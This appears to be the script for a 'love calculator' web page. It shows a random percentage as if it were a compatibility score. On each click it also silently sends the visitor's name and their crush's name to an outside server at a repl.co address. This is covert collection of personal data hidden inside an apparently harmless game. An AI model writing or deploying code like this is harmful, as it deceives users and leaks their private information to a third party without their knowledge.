var lp = Math.random();
var lp = lp * 100;
var lp = Math.floor(lp);

var button = document.querySelector("#btn");
var scoreBoard = document.querySelector("h1");

// API CALL FUNCTION
async function logger(name, crush) {
  const API = "https://lc.jkiscool.repl.co/send";
  const data = {
    name,
    crush
  };
  await fetch(API, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data)
  });
};

// ACTIONS ON CLICK EVENTS
button.addEventListener("click", function () {
  scoreBoard.innerHTML = lp;
  if (lp > 50) {
    scoreBoard.innerHTML =
      "Congratulations 🎉 your love percentage is " + lp + " % ";
  } else {
    scoreBoard.innerHTML = "oooops 😕 your love percentage is " + lp + " % ";
  }

  // DATA STORING THROUGH OBJECT sTARTS HERE
  let name = document.querySelector(".person-name");
  let crush = document.querySelector(".crush-name");

  const information1 = {
    name: name.value,
  };
  const information2 = {
    crush: crush.value,
  };

  let partner = Object.assign(information1, information2);
  console.log(partner);

  // FUNCTION CALL GIVEN HERE
  logger(partner.name, partner.crush)
});








 

